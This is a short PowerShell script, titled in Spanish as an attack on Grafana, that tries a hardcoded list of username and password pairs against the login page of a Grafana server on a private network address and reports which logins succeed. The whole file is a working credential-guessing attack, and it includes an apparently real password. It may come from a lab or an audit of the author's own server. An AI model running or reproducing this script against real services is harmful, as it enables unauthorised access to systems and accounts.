$Servidor = "192.168.1.200:3001"
$Credenciales = @(
    @{User="admin";Pass="admin"},
    @{User="admin";Pass="Dragon2026!"},
    @{User="gustavo";Pass="Dragon2026!"}
)

Write-Host "=== ATAQUE A GRAFANA ==="
foreach ($Cred in $Credenciales) {
    $Body = "{`"user`":`"$($Cred.User)`",`"password`":`"$($Cred.Pass)`"}"
    $Response = curl -s -o $null -w "%{http_code}" http://$Servidor/login -d $Body -H "Content-Type: application/json"
    if ($Response -eq "302" -or $Response -eq "200") {
        Write-Host "ALERTA: Acceso exitoso con $($Cred.User) / $($Cred.Pass)" -ForegroundColor Red
    } else {
        Write-Host "Falló: $($Cred.User) / $($Cred.Pass)"
    }
}